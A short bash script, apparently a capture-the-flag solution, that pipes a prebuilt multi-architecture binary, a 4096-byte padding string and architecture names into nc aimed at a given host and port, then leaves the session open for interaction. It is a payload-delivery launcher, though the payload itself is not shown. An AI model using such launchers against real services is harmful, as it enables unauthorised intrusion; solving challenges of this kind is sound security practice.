#!/bin/bash
if [ $# -lt 2 ]; then
    echo "Usage: $0 <host> <port>"
    exit 1
fi

( cat bins/arm64_lgp30_mix_pdp8.bin ; python -c "print 'a' * 4096" ; echo 'arm64' ; echo 'pdp-8' ; echo 'mix'; echo 'lgp-30'; cat ) | nc $1 $2
